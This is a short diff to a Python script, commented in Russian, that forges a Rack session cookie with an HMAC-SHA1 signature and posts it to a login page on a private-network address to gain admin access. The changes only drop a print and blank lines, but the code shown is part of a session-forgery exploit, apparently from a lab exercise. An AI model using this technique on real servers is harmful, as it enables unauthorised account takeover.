@@ -39,7 +39,6 @@ def get_new_signature(cookie, secret):
     return hmac.new(secret.encode(), cookie, sha1).hexdigest()
 
 
-
 #Получили ответ с уязвимого сервера
 URL = "http://192.168.0.102/login"
 data = 'login=test&password=test'
@@ -52,7 +51,5 @@ cookie, signature = cookie_content.split("--")
 cookie = unquote_to_bytes(cookie)
 
 new_cookie = get_new_cookie(cookie, signature)
-print(new_cookie)
 cookies = {'rack.session': new_cookie}
-
 admin_response = requests.post(URL, data=data, cookies=cookies, allow_redirects=True)
